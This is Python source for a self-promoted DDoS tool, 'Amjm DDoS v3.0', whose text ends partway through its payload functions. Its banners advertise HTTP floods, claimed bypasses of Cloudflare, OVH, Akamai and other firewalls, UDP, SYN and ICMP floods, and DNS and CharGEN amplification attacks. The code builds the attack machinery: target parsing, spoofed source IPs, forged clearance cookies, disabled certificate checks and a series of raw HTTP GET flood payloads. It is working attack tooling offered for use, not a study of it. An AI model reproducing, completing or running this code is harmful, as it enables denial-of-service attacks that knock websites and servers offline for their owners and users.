import socket
import threading
import random
import os
import time
import requests
import string
from colorama import Fore
from urllib.parse import urlparse
from random import choice as che
from random import randint as ran
from random import _urandom as byt
from certifi import where
from ssl import CERT_NONE , create_default_context
from colorama import init
from requests import get
from sys import argv
from fake_useragent import UserAgent
from datetime import datetime
from threading import Thread
from os import getpid
from os import kill as killx

try:
    init()
except:
    pass

app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

os.system('cls' if os.name == 'nt' else 'clear')

def layer7():
    sssss = f"""
    {green}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
 {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
 ░       ░
    {cyan}( {red}*** {green}CREATED BY {blue}Amjml {green}Coded by {green}YasinBm {red}| {red}@{blue}Hj_Amir3 | {yellow}Amjm DDoS | {red}@{magenta}amjm_ddos{red} ***{cyan} )
    """
    print(sssss)

    print(f'''{yellow}╔════════════════════════════════════════════════════════════════════════╗\n{yellow}║ {red}• {cyan}Layer{red}7 {blue}: {magenta}method url port thread rpc{yellow}                                  ║\n{yellow}║{red} •{cyan} Methods {magenta}: {yellow}                                                           ║\n║                                                                        ║\n║ {red}RAW    {cyan}( {green}HIGH PPS FLOOD {cyan}){yellow}                                              ║\n║ {red}BYPASS {cyan}({green} FIREWALL BYPASS OVH , CLOUDFLARE , DDoS-GURD , ... {cyan}){yellow}          ║\n║{red} MIX    {cyan}( {green}HTTP HEAD FLOOD {cyan}){yellow}                                             ║\n║ {red}CLOUD  {cyan}({green} BYPASS CLOUDFLARE NO-SEC , DDoS-GURD , OVH {cyan}){yellow}                  ║\n║ {red}GET    {cyan}( {green}HTTP GET FLOOD {cyan}){yellow}                                              ║\n║ {red}UAM    {cyan}({green} UAM BYPASS CLOUDFLARE {cyan}){yellow}                                       ║\n║ {red}WAF    {cyan}({green} FIREWALL BYPASS {red}+ {cyan}){yellow}                                           ║\n║ {red}OVH    {cyan}({green} OVH BYPASS METHOD {cyan}){yellow}                                           ║\n║ {red}ONEC   {cyan}( {green}HIGH PPS FLOOD WITH CLOSE CONNECTION{cyan} ){yellow}                        ║\n║ {red}SKY    {cyan}({green} GET COOKIE FLOOD {cyan}){yellow}                                            ║\n║ {red}SPOOF  {cyan}({green} SPOOF HEADER GET METHOD {cyan}){yellow}                                     ║\n║ {red}POST   {cyan}({green} POST BYPASS FLOOD {cyan}){yellow}                                           ║\n║ {red}RAW+   {cyan}({green} GET FLOOD BYPASS {cyan}){yellow}                                            ║\n║ {red}HIGH   {cyan}({green} HIGH PPS WITH COOKIE AND BYPASS FIREWALL {cyan}){yellow}                    ║\n║ {red}UAM+   {cyan}({green} UAM BYPASS CLOUDFLARE {red}+ {cyan}){yellow}                                     ║\n║ {red}TLS    {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF{cyan} ){yellow}                 ║\n║ {red}HTTP/2 {cyan}({green} HTTP/2 GET FLOOD WITH COOKIE{cyan} ){yellow}                                ║\n║ {red}GURD   {cyan}({green} BYPASS DDoS-Gurd WAF {cyan}){yellow}                                        ║\n║ {red}KILL   {cyan}({green} HIGH HTTP GET FLOOD{cyan} ){yellow}                                         ║\n║ {red}TLSV2  {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF WITH OUT COOKIE{cyan} ){yellow} ║\n║ {red}NULL   {cyan}({green} NULL HEADERS FLOOD{cyan} ){yellow}                                          ║\n║{red} KILL+  {cyan}({green} HTTP/2 GET FLOOD WITH COOKIE {red}+{cyan} ){yellow}                              ║\n║{red} HTTPS  {cyan}({green} HTTP HEADER FLOOD {red}+{cyan} ){yellow}                                         ║\n║{red} IR     {cyan}({green} BYPASS IRANIAN FIREWALL {red}{cyan}){yellow}                                     ║\n║ {red}WAR    {cyan}( {green}BYPASS AMAZON & VSHIELD WAF {yellow}[{red}x {cyan}Cookie {yellow}] {cyan}){yellow}                     ║\n║ {red}WAR+   {cyan}( {green}BYPASS AMAZON & VSHIELD WAF WITH COOKIE {cyan}){yellow}                     ║\n║ {red}ZEUS   {cyan}( {green}BYPASS AKAMAI & ALL WAFs {cyan}){yellow}                                    ║\n║ {red}BY+ {cyan}   ({green} FIREWALL BYPASS OVH , CLOUDFLARE , DDoS-GURD , ...{red} +{cyan} ){yellow}        ║\n║ {red}PRO    {cyan}( {green}BYPASS FASLY WAF {cyan}){yellow}                                            ║\n║ {red}CRASH  {cyan}( {green}BYPASS IRANIAN FIREWALLS {yellow}[{red}x {cyan}Cookie {yellow}]{cyan} ){yellow}                        ║\n║ {red}HTTPS+ {cyan}( {green}HTTPS GET FLOOD HTTP/1.2 VERSION WITH COOKIE{yellow}{cyan} ){yellow}                ║\n║ {red}WAF+   {cyan}({green} FIREWALL BYPASS {red}++ {cyan}){yellow}                                          ║\n║ {red}STORM  {cyan}({green} BEST METHOD FOR DSTAT {cyan}){yellow}                                       ║\n║ {red}STORM+ {cyan}({green} BEST METHOD FOR DSTAT {red}+ {cyan}){yellow}                                     ║\n║ {red}FUCK   {cyan}({green} HIGH HTTP GET FLOOD {red}++{cyan} ){yellow}                                      ║\n║ {red}TLSV3  {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF {red}++{cyan} ){yellow}              ║\n║ {red}TLSV4  {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF {red}+++{cyan} ){yellow}             ║\n║ {red}SKY+   {cyan}({green} GET COOKIE FLOOD {red}+ {cyan}){yellow}                                          ║\n║                                                                        ║\n║ {red}#{cyan}Amjm | {magenta}@Hj_Amir3 | {green}TELEGRAM{yellow}                                     ║\n╚════════════════════════════════════════════════════════════════════════╝\n╔════════════════════════════════════════════════════════════════════════╗\n║ {red}• {yellow}tls {cyan}https://www.example.com {green}443 {magenta}1000 {red}1500{cyan} 120{yellow}                        ║\n║ {red}•{cyan} Amjm{red}-{cyan}DDoS{yellow}                                                            ║\n╚════════════════════════════════════════════════════════════════════════╝''')

layer4 = f"""
    {red}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
 {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
 ░       ░
    {cyan}( {red}*** {green}CREATED BY {blue}Amjm {green}Coded by {green}YasinBm {red}| {red}@{blue}Hj_Amir3 | {yellow}Amjm_DDoS | {red}@{magenta}amjm_ddos{red} ***{cyan} )
    {yellow}╔════════════════════════════════════════════════════════════════════════╗
    {yellow}║ {red}• {blue}Layer{green}4 : {magenta}method ip port thread rpc{yellow}                                   ║
    {yellow}║ {red}• {blue}Methods {red}:   {yellow}                                                         ║
    {yellow}║                       {yellow}                                                 ║
    {yellow}║ {red}UDP   {cyan}( {green}Send UDP packet to server {cyan}){yellow}                                    ║
    {yellow}║ {red}TCP   {cyan}( {green}Send TCP packet to server {cyan}){yellow}                                    ║
    {yellow}║ {red}SYN   {cyan}( {green}Send SYN packet to server {cyan}) {yellow}                                   ║
    {yellow}║ {red}ICMP  {cyan}( {green}Send ICMP packet to server {cyan}){yellow}                                   ║
    {yellow}║ {red}GUDP  {cyan}( {green}Send GUDP packet to server {cyan}){yellow}                                   ║
    {yellow}║ {red}UDP+  {cyan}( {green}Send UDP packet to server {red}+ {cyan}){yellow}                                  ║
    {yellow}║ {red}DNS   {cyan}( {green}DNS amplification attack {cyan}){yellow}                                     ║
    {yellow}║ {red}AMP   {cyan}( {green}CharGEN amplification attack {cyan}){yellow}                                 ║
    {yellow}║ {red}FLOOD {cyan}( {green}OVH SERVER UDP FLOOD {cyan}){yellow}                                         ║
    {yellow}║ {red}HAND  {cyan}( {green}TCP HANDSHAKE FLOOD {cyan}){yellow}                                          ║                                  
    {yellow}║ {red}RDP   {cyan}( {green}UDP FLOOD ON RDP VPS {cyan}){yellow}                                         ║
    {yellow}║ {red}CRAFT {cyan}( {green}Mincraft SERVER ATTACK {cyan}){yellow}                                       ║
    {yellow}║                                                                        ║
    {yellow}║{red}#{cyan}Amjm | {red}@Hj_Amir3 | {green}TELEGRAM   {yellow}                                   ║
    {yellow}╚════════════════════════════════════════════════════════════════════════╝
    {yellow}╔════════════════════════════════════════════════════════════════════════╗
    {yellow}║ {red}• {cyan}udp {magenta}127.0.0.1 80 1000 1500 120{yellow}                                       ║
    {yellow}║ {red}• {green}Amjm{red}-{green}DDoS{yellow}                                                            ║
    {yellow}╚════════════════════════════════════════════════════════════════════════╝
"""

def respon():
    try:
        print(f"""
                {blue}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
    ░  ░  {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
            {cyan}╔══════════════════════════════════════════════════════════════════╗

                                    {yellow} Response {red}: {green}{rs}
                                    {yellow} Target   {red}: {green}{url}

            {cyan}╚══════════════════════════════════════════════════════════════════╝""")
    except:
        pass

launch = f"""
    {green}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
 {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
 ░       ░
    {cyan}( {red}*** {green}CREATED BY {blue}Amjm {green}Coded by {green}YasinBm {red}| {red}@{blue}Hj_Amir3 | {yellow}Amjm DDoS | {red}@{magenta}Amjm_DDoS{red} ***{cyan} )
    {yellow}╔══════════════════════════════════════════════════════════════════════════════╗
    {yellow}║                              {magenta}Amjm_DDoS{yellow}                                       ║
    {yellow}║ {yellow}                                                                             ║
    {yellow}║               {green}Launch {red}: {yellow}Linux {red}:{yellow} python3 ddos.py {red}<{blue}options{red}> {yellow}                    ║
    {yellow}║               {green}Launch {red}: {yellow}Windows {red}: {yellow}python ddos.py {red}<{blue}options{red}>{yellow}                    ║
    {yellow}║                                                    {yellow}                          ║
    {yellow}║    {cyan}Methods {red}| {green}Linux {red}: {green}python3 ddos.py l7 {red}|{green} Windows {red}: {green}python ddos.py l7 {yellow}       ║
    {yellow}║                                                          {yellow}                    ║
    {yellow}║                  {red}#{cyan}Amjm {red}| {cyan}@{red}Hj_Amir3 | {green}TELEGRAM   {yellow}                       ║
    {yellow}╚══════════════════════════════════════════════════════════════════════════════╝
"""

def options():
    sss = f'''
        {blue}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
  {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
    ░       ░
'''
    print(sss)
    print(f'''            {yellow}╔══════════════════════════════════════════════════════════════════════════════╗
            {yellow}║                                                   			   ║
            {yellow}║ {red}PUBLIC    {cyan}({green} GET YOUR SERVER PUBLIC ADDRES {cyan}){yellow}                                  ║
            {yellow}║ {red}INFO      {cyan}({green} GET WEBSITE FIREWALL INFO {cyan}){yellow}	    			           ║
            {yellow}║ {red}STAT_REQ  {cyan}({green} GET WEBSITE STATUS CODE {cyan}){yellow}                                        ║
            {yellow}║ {red}OPTIONS   {cyan}({green} SHOW OPTIONS {cyan}){yellow}                                                   ║
            {yellow}║ {red}CLEAR     {cyan}({green} CLEAR PAGE {cyan}){yellow}                                                     ║
            {yellow}║ {red}PING      {cyan}({green} GET WEBSITE IP ADDRES {cyan}){yellow}                                          ║
            {yellow}║                                                                              ║
            {yellow}║ {red}#{blue}Amjm{red}-{blue}DDoS {red}@{green}Hj_Amir3{yellow}                                                       ║
            {yellow}╚══════════════════════════════════════════════════════════════════════════════╝
''')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
try:
    try:
        if str(argv[1]) == 'l7':
            layer7()
        elif str(argv[1]) == 'l4':
            print(layer4)
        elif str(argv[1]) == 'all':
            layer7()
            print(layer4)
    except:
        print(launch)
        pass
except:
    pass

try:
    method = str(argv[1])
    url = str(argv[2])
    port = int(argv[3])
    threads = int(argv[4])
    rpc = int(argv[5])
    timme = int(argv[6])
    proxy = int(argv[7])
except:
    pass

def timer():
    try:
        time.sleep(timme); killx(getpid(), 9)
    except:
        pass

try:
    def generate_fake_phpsessid(length):
        characters = string.ascii_letters + string.digits
        fake_phpsessid = ''.join(random.choice(characters) for _ in range(length))
        return fake_phpsessid

    fake_cookie_phpsessid = generate_fake_phpsessid(147)
    fake_cookie_phpsessidd = generate_fake_phpsessid(32)
    response = get(url)
    cresponse = requests.get(url);cookie = response.cookies
    if cookie == '':
        cookie = ("cf_clearance="+fake_cookie_phpsessid, "PHPSSID="+fake_cookie_phpsessidd)
except:
    pass

try:
    if url.split('://')[0] == 'https' or 'http':
        parsed_url = urlparse(url)
        target = parsed_url.netloc
        path = parsed_url.path
        target2 = argv[2]
    else:
        pass
except:
    pass

try:
    if path == "":
        path = "/"
except:
    pass

def ping():
    print(f'''{blue}                                                                                                 
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
  {blue}({red}v.{yellow}3{red}.{yellow}0{blue})''')
    print(f'\n{blue}IP ADDRES WEBSITE {white}{url} {red}:{green}',socket.gethostbyname(target))

try:
    now = datetime.now()
    current_datetime = datetime.now()
    date = current_datetime.date()
    timee = now.strftime('%H:%M:%S')

    response = requests.get(f"http://ip-api.com/json/{target}")
    response.raise_for_status()
    data = response.json()

    isp = data['as']
    city = data['city']
    zone = data['timezone']
except:
    pass

try:
    info = f"""
                {magenta}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
   ░  ░  {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
            {cyan}╔══════════════════════════════════════════════════════════════════╗
            {yellow} Date   {red}: {green}{date}
            {yellow} Time   {red}: {green}{timee}
            {yellow} Isp    {red}: {green}{isp}
            {yellow} Zone   {red}: {green}{zone}
            {yellow} City   {red}: {green}{city}
            {cyan}╚══════════════════════════════════════════════════════════════════╝
    """
except:
    pass

def s2():
    print(Fore.LIGHTRED_EX+"["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")

try:
    started = f"""
                    {green}╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═     ╔═╗╔╦╗╔═╗╦═╗╔╦╗╔═╗╔╦╗ {magenta}TEAm{red}Amjm{green}DDoS {yellow}™
                    {green}╠═╣ ║  ║ ╠═╣║  ╠╩╗ {red}───{green} ╚═╗ ║ ╠═╣╠╦╝ ║ ║╣  ║║ {green}Amjm{red}-{green}DDoS {green}V{cyan}3
                    {green}╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩     ╚═╝ ╩ ╩ ╩╩╚═ ╩ ╚═╝═╩╝ {red}Created {blue}By {yellow}Am {magenta}Jm

            {red}╔══════════════════════════════════════════════════════════════════╗
            {red} Method {white}: {white}[ {red}{method}{red} ]
            {red} Target {white}: {white}[ {red}{url}{red} ]
            {red} Port   {white}: {white}[ {red}{port}{red} ]
            {red} Thread {white}: {white}[ {red}{threads}{red} ]
            {red} Rpc    {white}: {white}[ {red}{rpc}{red} ]
            {red} Timer  {white}: {white}[ {red}{timme}s{red} ]
            {red}╚══════════════════════════════════════════════════════════════════╝
            
{yellow}\nNote {red}: {cyan}Hi Guys if You Liked This Tool Pls follow Telegram Channel {green}https://t.me/@Amjm_DDoS
"""
except:
    pass

def public():
    rss = requests.get('https://api.ipify.org').text
    print(f'{green}Public_Ip {red}:{yellow} {rss} ')

try:
    def printl(Str):
        for char in Str:
            print(char, end='', flush=True)
            time.sleep(0.00009)
except:
    pass

try:
    printl(started)
except:
    pass

us = UserAgent()
ua = us.random

ssl = create_default_context(cafile=where())
ssl.check_hostname = False
ssl.verify_mode = CERT_NONE

def check():
    while True:
        try:
            return requests.get(url)
        except:
            print(f'{red}Connection Timedout')

def strm(siz):
    return '%0x' % ran(0, 16 ** siz)

def spo_ip():
        addr = [192, 168, 0, 1]; d = '.'; addr[0] = str(ran(11, 197)); addr[1] = str(ran(0, 255)); addr[2] = str(ran(0, 255)); addr[3] = str(ran(2, 254)); ass = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]; return ass

def generate_payload1():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n'.encode()

def generate_payload2():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Cotrol: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload3():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\nAccept: {che(app)}\r\nAccept-Ranges: bytes\r\nCache-Control: max-age=0\r\n\r\n'.encode()

def generate_payload4():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nDNT: 1\r\nReferer: {che(reff)}\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload5():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nReferer: {che(reff)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()

def generate_payload6():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: en-US,en;q=0.9\r\nConndection: keep-alive\r\nCache-Control: max-age=0\r\nSec-Fetch-Site: same-origin\r\nReferer: {url}\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload7():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()

def generate_payload8():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()

def generate_payload9():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nCache-Control: max-age=0\r\nConnection: close\r\n\r\n'.encode()

def generate_payload10():
